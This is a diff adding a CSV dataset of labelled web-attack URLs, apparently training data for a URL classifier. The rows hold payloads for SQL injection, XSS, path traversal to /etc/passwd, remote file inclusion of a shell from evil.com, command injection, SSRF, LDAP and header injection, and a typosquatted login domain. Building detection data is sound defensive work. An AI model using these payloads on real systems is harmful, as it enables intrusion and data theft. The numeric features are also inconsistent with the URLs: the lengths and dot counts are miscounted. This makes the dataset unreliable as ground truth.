@@ -1,0 +1,15 @@
+url,length,num_dots,num_slashes,num_special_chars,has_sql_keywords,has_script,has_traversal,has_http,has_ip,label,final_classification
+http://testphp.vuln/login?id=1 OR 1=1--,52,2,3,6,1,0,0,0,0,SQLi,SQL Injection
+"http://testphp.vuln/login?id=1/**/UNION/**/SELECT/**/null,null--",78,2,3,10,1,0,0,0,0,SQLi,SQL Injection
+http://testphp.vuln/search?q=<script>alert(1)</script>,60,2,3,8,0,1,0,0,0,XSS,Cross-Site Scripting (XSS)
+http://testphp.vuln/search?q=%3Cscript%3Ealert(1)%3C/script%3E,72,2,3,12,0,1,0,0,0,XSS,Cross-Site Scripting (XSS)
+http://testphp.vuln/download?file=../../etc/passwd,65,2,5,6,0,0,1,0,0,Traversal,Directory Traversal
+http://testphp.vuln/index.php?page=../../etc/passwd,62,2,4,5,0,0,1,0,0,LFI,Local File Inclusion (LFI)
+http://testphp.vuln/index.php?page=http://evil.com/shell.php,75,3,4,6,0,0,0,1,0,RFI,Remote File Inclusion (RFI)
+http://testphp.vuln/ping?ip=127.0.0.1;whoami,58,2,3,5,0,0,0,0,1,Command Injection,Command Injection
+http://testphp.vuln/fetch?url=http://127.0.0.1/admin,70,3,4,5,0,0,0,1,1,SSRF,Server-Side Request Forgery (SSRF)
+http://testphp.vuln/login?user=*)(|(user=*)),55,2,3,7,0,0,0,0,0,LDAP,LDAP Injection
+http://testphp.vuln/page?name=abc%0d%0aSet-Cookie:evil=true,80,2,3,12,0,0,0,0,0,Header Injection,HTTP Header Injection
+http://arnazon-login.com,25,2,1,2,0,0,0,0,0,Phishing,Typosquatting / URL Spoofing
+http://testphp.vuln/home,30,2,2,1,0,0,0,0,0,Normal,Normal
+http://testphp.vuln/products?id=10,40,2,3,2,0,0,0,0,0,Normal,Normal
